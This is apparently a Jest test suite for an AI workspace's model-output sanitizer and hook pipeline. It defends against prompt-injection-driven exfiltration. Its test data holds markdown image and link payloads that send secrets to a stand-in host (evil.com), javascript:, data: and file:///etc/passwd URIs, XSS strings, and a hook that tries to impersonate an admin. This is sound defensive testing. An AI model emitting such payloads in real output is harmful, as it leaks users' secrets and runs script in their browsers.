/**
 * Saneado de la salida del modelo (prompt injection / exfiltración) y hooks del pipeline.
 */
const { sanitizeModelOutput, trustedUrl, BLOCKED_LINK, BLOCKED_IMAGE } = require('../../services/ai-workspace/outputSanitizer');
const { HookRegistry, registerDefaultHooks, STAGES, MAX_MESSAGE } = require('../../services/ai-workspace/hooks');

const principal = { userId: 'u1', tenantId: 't1', roles: ['USER'], plan: 'free' };

describe('sanitizeModelOutput', () => {
    const s = sanitizeModelOutput;

    test('entradas no válidas → cadena vacía; texto normal intacto', () => {
        expect(s(null)).toBe('');
        expect(s(undefined)).toBe('');
        expect(s(42)).toBe('');
        expect(s('')).toBe('');
        const md = '## Staking\n\n- Abre **Staking**\n- Deposita `BEZ`\n\n```js\nconst a = 1 < 2;\n```';
        expect(s(md)).toBe(md);
    });

    describe('exfiltración por imágenes', () => {
        test.each([
            '![x](https://evil.com/p.png?d=SECRETO)',
            '![](https://evil.com/a)',
            '![a][ref]',
            '![x](/rwa)', // incluso internas: el modelo no debe insertar imágenes
            '![x](data:image/png;base64,AAAA)',
        ])('bloquea %s', (img) => {
            const out = s(`antes ${img} después`);
            expect(out).toContain(BLOCKED_IMAGE);
            expect(out).not.toMatch(/evil|SECRETO|base64/);
        });
    });

    describe('enlaces', () => {
        test('conserva enlaces a rutas internas del catálogo y a dominios propios', () => {
            expect(s('[Staking](/staking)')).toBe('[Staking](/staking)');
            expect(s('[Planes](/settings#plan)')).toBe('[Planes](/settings#plan)');
            expect(s('[Web](https://www.bezhas.com/rwa)')).toBe('[Web](https://www.bezhas.com/rwa)');
        });

        test.each([
            '[Entra en bezhas.com](https://evil.com/login)',
            '[x](http://bezhas.com)',               // http, no https
            '[x](https://bezhas.com.evil.com)',      // subdominio engañoso
            '[x](https://evil.com/bezhas.com)',
            '[x](https://user:pass@bezhas.com)',     // credenciales en la URL
            '[x](https://bezhas.com:8443/x)',        // puerto no estándar
            '[x](//evil.com)',
            '[x](javascript:alert(1))',
            '[x](JaVaScRiPt:alert(1))',
            '[x](data:text/html,<script>1</script>)',
            '[x](vbscript:x)',
            '[x](file:///etc/passwd)',
            '[x](/%2fevil.com)',
            '[x](/ruta-no-listada)',
            '[x](/rwa/../admin)',
        ])('neutraliza %s', (link) => {
            const out = s(link);
            expect(out).toContain(BLOCKED_LINK);
            expect(out).not.toMatch(/\]\(/);
        });

        test('enlace con título y definiciones de referencia', () => {
            expect(s('[x](https://evil.com "t")')).toContain(BLOCKED_LINK);
            expect(s('[x][1]\n\n[1]: https://evil.com')).toContain(BLOCKED_LINK);
            expect(s('[x][1]\n\n[1]: /staking')).toContain('[1]: /staking');
        });

        test('autoenlaces y URLs sueltas', () => {
            expect(s('mira <https://evil.com/x>')).toContain(BLOCKED_LINK);
            expect(s('mira https://evil.com/x ahora')).toContain(BLOCKED_LINK);
            expect(s('mira ftp://evil.com/x')).toContain(BLOCKED_LINK);
            expect(s('mira https://www.bezhas.com/rwa')).toContain('https://www.bezhas.com/rwa');
        });

        test('el texto del enlace se conserva pero sin destino', () => {
            expect(s('[Pulsa aquí](https://evil.com)')).toBe(`Pulsa aquí ${BLOCKED_LINK}`);
        });
    });

    describe('HTML y caracteres', () => {
        test.each([
            '<script>alert(1)</script>', '<SCRIPT SRC=//evil></SCRIPT>', '<iframe src="https://evil"></iframe>',
            '<img src=x onerror=alert(1)>', '<svg onload=alert(1)>', '<a href="javascript:x">x</a>', '<form action="//evil"><input></form>',
            '<style>*{background:url(//evil)}</style>', '<object data="//evil"></object>',
        ])('elimina %s', (html) => {
            const out = s(`a ${html} b`);
            expect(out).not.toMatch(/<\s*(script|iframe|img|svg|a|form|style|object)|onerror|onload|javascript:/i);
            expect(out.startsWith('a ')).toBe(true);
        });

        test('elimina caracteres de control y marcas bidireccionales, conserva saltos de línea y tabs', () => {
            expect(s('a\u0000b\u0007c‮d⁦e\nf\tg')).toBe('abcde\nf\tg');
        });
    });

    describe('datos sensibles', () => {
        test('oculta claves privadas (64 hex, con o sin 0x)', () => {
            const key = 'a'.repeat(64);
            expect(s(`tu clave es 0x${key}`)).toBe('tu clave es [dato sensible oculto]');
            expect(s(key)).toBe('[dato sensible oculto]');
        });
        test('no toca direcciones (40 hex) ni hashes cortos', () => {
            const addr = `0x${'b'.repeat(40)}`;
            expect(s(`dirección ${addr}`)).toBe(`dirección ${addr}`);
        });
    });

    test('es idempotente (aplicarlo dos veces no cambia el resultado)', () => {
        const dirty = '![x](https://evil.com) [a](https://evil.com) <script>1</script> [ok](/staking) https://evil.com 0x' + 'c'.repeat(64);
        const once = s(dirty);
        expect(s(once)).toBe(once);
    });

    test('entradas patológicas no cuelgan el proceso (acotado)', () => {
        const t = Date.now();
        s('['.repeat(50000) + '](' + 'a'.repeat(50000));
        s('<'.repeat(50000));
        s('![' + 'a'.repeat(100000));
        expect(Date.now() - t).toBeLessThan(2000);
    });

    test('AI_TRUSTED_LINK_HOSTS permite ampliar los dominios propios', () => {
        process.env.AI_TRUSTED_LINK_HOSTS = 'docs.bezhas.com';
        try {
            expect(trustedUrl('https://docs.bezhas.com/x')).toBe(true);
            expect(trustedUrl('https://www.bezhas.com/x')).toBe(false);
        } finally { delete process.env.AI_TRUSTED_LINK_HOSTS; }
    });
});

describe('HookRegistry', () => {
    test('registro, orden por prioridad (estable) y listado', async () => {
        const reg = new HookRegistry();
        const order = [];
        reg.register('beforeChat', () => { order.push('c'); }, { name: 'c', priority: 300 });
        reg.register('beforeChat', () => { order.push('a1'); }, { name: 'a1', priority: 10 });
        reg.register('beforeChat', () => { order.push('a2'); }, { name: 'a2', priority: 10 });
        reg.register('beforeChat', () => { order.push('b'); }, { name: 'b', priority: 100 });
        expect(reg.list('beforeChat')).toEqual(['a1', 'a2', 'b', 'c']);
        await reg.run('beforeChat', { principal, message: 'x' });
        expect(order).toEqual(['a1', 'a2', 'b', 'c']);
    });

    test('etapa desconocida o hook inválido → error', async () => {
        const reg = new HookRegistry();
        expect(() => reg.register('nope', () => {})).toThrow(/desconocida/);
        expect(() => reg.register('beforeChat', 'no-fn')).toThrow(TypeError);
        await expect(reg.run('nope', {})).rejects.toThrow(/desconocida/);
        expect(STAGES).toEqual(['beforeChat', 'afterModel', 'onAction']);
    });

    test('cada hook recibe el resultado del anterior (encadenado)', async () => {
        const reg = new HookRegistry();
        reg.register('afterModel', ({ text }) => ({ text: text + '1' }), { priority: 1 });
        reg.register('afterModel', ({ text }) => ({ text: text + '2' }), { priority: 2 });
        expect((await reg.run('afterModel', { principal, text: 'x' })).text).toBe('x12');
    });

    test('un hook no puede sustituir al principal (identidad solo de la sesión)', async () => {
        const reg = new HookRegistry();
        reg.register('beforeChat', () => ({ principal: { userId: 'attacker', roles: ['ADMIN'] }, message: 'ok' }));
        const out = await reg.run('beforeChat', { principal, message: 'x' });
        expect(out.principal).toBe(principal);
        expect(out.message).toBe('ok');
    });

    test('hooks no críticos fallan ABIERTO (se registra y se continúa)', async () => {
        const reg = new HookRegistry();
        const warn = jest.spyOn(console, 'warn').mockImplementation(() => {});
        reg.register('onAction', () => { throw new Error('métricas caídas'); }, { name: 'metrics', priority: 1 });
        reg.register('onAction', () => ({ outcome: 'seguido' }), { priority: 2 });
        const out = await reg.run('onAction', { principal, action: 'staking' });
        expect(out.outcome).toBe('seguido');
        expect(warn).toHaveBeenCalledWith(expect.stringContaining('metrics'));
        warn.mockRestore();
    });

    test('hooks críticos fallan CERRADO y los errores con status bloquean', async () => {
        const reg = new HookRegistry();
        reg.register('beforeChat', () => { throw new Error('guarda rota'); }, { critical: true });
        await expect(reg.run('beforeChat', { principal, message: 'x' })).rejects.toThrow('guarda rota');
        const reg2 = new HookRegistry();
        reg2.register('beforeChat', () => { throw Object.assign(new Error('prohibido'), { status: 403 }); });
        await expect(reg2.run('beforeChat', { principal, message: 'x' })).rejects.toMatchObject({ status: 403 });
    });

    test('register devuelve una función para darlo de baja', async () => {
        const reg = new HookRegistry();
        const fn = jest.fn();
        const off = reg.register('onAction', fn);
        off();
        await reg.run('onAction', { principal });
        expect(fn).not.toHaveBeenCalled();
        expect(reg.list('onAction')).toEqual([]);
    });

    test('soporta hooks asíncronos', async () => {
        const reg = new HookRegistry();
        reg.register('afterModel', async ({ text }) => { await new Promise((r) => setTimeout(r, 5)); return { text: text.toUpperCase() }; });
        expect((await reg.run('afterModel', { principal, text: 'ab' })).text).toBe('AB');
    });
});

describe('hooks por defecto', () => {
    const make = (audit) => registerDefaultHooks(new HookRegistry(), audit ? { audit } : undefined);

    test('registran inputGuard, outputSanitizer y actionAudit', () => {
        const reg = make();
        expect(reg.list('beforeChat')).toEqual(['inputGuard']);
        expect(reg.list('afterModel')).toEqual(['outputSanitizer']);
        expect(reg.list('onAction')).toEqual(['actionAudit']);
    });

    test('inputGuard: normaliza, recorta y valida (400 vacío, 413 demasiado largo)', async () => {
        const reg = make();
        expect((await reg.run('beforeChat', { principal, message: '  hola\u0000 mundo  ' })).message).toBe('hola mundo');
        await expect(reg.run('beforeChat', { principal, message: '   ' })).rejects.toMatchObject({ status: 400 });
        await expect(reg.run('beforeChat', { principal, message: '\u0000\u0007' })).rejects.toMatchObject({ status: 400 });
        await expect(reg.run('beforeChat', { principal, message: 'x'.repeat(MAX_MESSAGE + 1) })).rejects.toMatchObject({ status: 413 });
        await expect(reg.run('beforeChat', { principal, message: 'x'.repeat(MAX_MESSAGE) })).resolves.toBeTruthy();
    });

    test('inputGuard: un mensaje que no es cadena se trata como vacío', async () => {
        await expect(make().run('beforeChat', { principal, message: { $ne: 1 } })).rejects.toMatchObject({ status: 400 });
    });

    test('outputSanitizer se aplica en afterModel', async () => {
        const out = await make().run('afterModel', { principal, text: 'x ![a](https://evil.com/?d=1) y' });
        expect(out.text).toBe(`x ${BLOCKED_IMAGE} y`);
    });

    test('actionAudit llama al callback con usuario, acción y resultado', async () => {
        const audit = jest.fn();
        await make(audit).run('onAction', { principal, action: 'staking', outcome: 'opened' });
        expect(audit).toHaveBeenCalledWith(expect.objectContaining({ action: 'staking', outcome: 'opened', principal }));
    });

    test('un fallo del auditor no impide la acción (fail-open) pero sí el del saneado (fail-closed)', async () => {
        const warn = jest.spyOn(console, 'warn').mockImplementation(() => {});
        await expect(make(() => { throw new Error('log caído'); }).run('onAction', { principal, action: 'x', outcome: 'ok' })).resolves.toBeTruthy();
        warn.mockRestore();
        const reg = make();
        reg.register('afterModel', () => { throw new Error('x'); }, { critical: true, priority: 1 });
        await expect(reg.run('afterModel', { principal, text: 'x' })).rejects.toThrow();
    });
});
